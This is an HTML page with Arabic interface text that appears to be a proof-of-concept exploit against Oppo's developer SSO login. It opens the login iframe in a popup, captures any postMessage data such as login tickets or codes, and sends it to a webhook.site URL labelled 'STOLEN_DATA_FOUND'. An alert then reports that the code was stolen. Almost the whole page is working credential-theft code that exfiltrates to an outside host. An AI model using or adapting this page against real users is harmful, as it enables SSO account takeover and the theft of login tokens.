<!DOCTYPE html>
<html>
<head>
    <title>تجهيز فخ اصطياد الكود</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
        button { padding: 20px 40px; font-size: 20px; cursor: pointer; background: #0f0; color: #000; border: none; font-weight: bold; }
        #status { margin-top: 20px; font-size: 18px; color: #ffeb3b; }
    </style>
</head>
<body>
    <h1>اضغط لتحديث العرض</h1>
    <button id="start">View Content</button>
    <div id="status">في انتظار الضغط...</div>

    <script>
        const WEBHOOK = "https://webhook.site/d5c8bb4e-44ab-4edd-aa98-ce5cb4712920";
        const OPPO_URL = "https://developers.oppomobile.com/user/web-sso/login-iframe?fromLocation=" + 
                         encodeURIComponent("https://developers.oppomobile.com/user/web-sso/login-iframe?fromLocation=x");

        document.getElementById('start').onclick = function() {
            document.getElementById('status').innerText = "تم فتح النافذة، جاري مراقبة الكود...";
            
            // فتح نافذة الـ SSO
            // سنحتفظ بمرجع للنافذة (targetWindow)
            const targetWindow = window.open(OPPO_URL, "oppo_login", "width=600,height=700");

            // مراقبة الرسائل القادمة من النافذة الجديدة
            window.addEventListener('message', function(event) {
                // نحن نبحث عن أي رسالة تحتوي على ticket أو code
                if (event.data) {
                    console.log("تم اصطياد بيانات!", event.data);
                    
                    // إرسال البيانات فوراً للويب هوك
                    fetch(WEBHOOK, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({
                            label: "STOLEN_DATA_FOUND",
                            payload: event.data,
                            origin: event.origin
                        })
                    });

                    if (event.data.channel === 'sdk-login-status') {
                        alert("تم سرقة الكود بنجاح! افحص الويب هوك.");
                        document.getElementById('status').innerText = "✅ تم الاستيلاء على البيانات!";
                    }
                }
            });
        };
    </script>
</body>
</html>
